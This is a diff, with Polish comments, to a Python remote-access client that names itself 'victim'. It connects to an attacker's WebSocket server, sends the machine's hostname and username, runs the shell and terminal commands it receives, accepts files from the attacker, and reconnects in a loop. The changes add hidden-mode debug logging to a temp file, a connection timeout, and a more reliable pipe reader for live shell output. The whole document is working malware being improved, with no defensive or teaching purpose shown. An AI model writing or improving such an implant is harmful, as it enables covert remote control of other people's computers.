@@ -9,6 +9,17 @@ import threading
 import select
 import sys
 import io
+import logging
+
+# ─── Logowanie do pliku (widoczne nawet jak victim jest ukryty) ───
+LOG_FILE = os.path.join(tempfile.gettempdir(), "victim_debug.log")
+logging.basicConfig(
+    filename=LOG_FILE,
+    level=logging.DEBUG,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    datefmt="%Y-%m-%d %H:%M:%S"
+)
+log = logging.getLogger("victim")
 
 try:
     from websocket import create_connection, WebSocketConnectionClosedException
@@ -68,14 +79,13 @@ def handle_terminal_start(ws):
         def reader():
             global terminal_process
             proc = terminal_process
+            fd = proc.stdout.fileno()
             try:
-                # Używamy BufferedReader.read1() — czyta tyle ile jest DOSTĘPNE
-                # w buforze, zamiast blokować do pełnych 4096 bajtów.
-                # Na Windows read(4096) może blokować zbyt długo.
-                buffered = io.BufferedReader(proc.stdout, buffer_size=4096)
                 while proc and proc.poll() is None:
                     try:
-                        data = buffered.read1(4096)
+                        # os.read() czyta tyle ile jest dostępne w buforze pipe
+                        # Działa poprawnie zarówno na Windows jak i Linux
+                        data = os.read(fd, 4096)
                     except (ValueError, OSError):
                         # Pipe zamknięty
                         break
@@ -255,11 +265,15 @@ def handle_execute(ws, data):
 def connect_loop():
     """Łączy się z serwerem i nasłuchuje poleceń."""
     url = f"{SERVER_URL}?id={VICTIM_ID}"
+    log.info(f"Victim startuje. ID={VICTIM_ID}, URL={url}")
+    log.info(f"Log file: {LOG_FILE}")
 
     while True:
         try:
+            log.info(f"Łączenie z {url} ...")
             print(f"[*] Łączenie z {url} ...")
-            ws = create_connection(url)
+            ws = create_connection(url, timeout=30)
+            log.info(f"Połączono jako '{VICTIM_ID}'")
             print(f"[+] Połączono jako '{VICTIM_ID}'")
 
             # Powitanie
@@ -270,10 +284,12 @@ def connect_loop():
                 "hostname": socket.gethostname(),
                 "user": os.getenv("USER") or os.getenv("USERNAME", "?")
             }))
+            log.info("Hello wysłane, wchodzę w pętlę recv")
 
             while True:
                 raw = ws.recv()
                 if not raw:
+                    log.warning("Otrzymano puste dane z serwera")
                     break
 
                 # Dane binarne (plik od attackera)
@@ -285,9 +301,11 @@ def connect_loop():
                 try:
                     data = json.loads(raw)
                 except json.JSONDecodeError:
+                    log.warning(f"Nieprawidłowy JSON: {raw[:200]}")
                     continue
 
                 msg_type = data.get("type", "")
+                log.info(f"Otrzymano polecenie: {msg_type}")
                 print(f"  [←] Polecenie: {msg_type}")
 
                 if msg_type == "shell":
@@ -308,12 +326,16 @@ def connect_loop():
                     safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Nieznany typ: {msg_type}"}))
 
         except WebSocketConnectionClosedException:
+            log.warning("Serwer zamknął połączenie")
             print("[!] Serwer zamknął połączenie")
         except ConnectionRefusedError:
+            log.warning("Odmowa połączenia")
             print("[!] Odmowa połączenia")
         except Exception as e:
+            log.exception(f"Błąd w connect_loop: {e}")
             print(f"[!] Błąd: {e}")
 
+        log.info(f"Ponowna próba za {RECONNECT_DELAY}s ...")
         print(f"[*] Ponowna próba za {RECONNECT_DELAY}s ...")
         time.sleep(RECONNECT_DELAY)
 
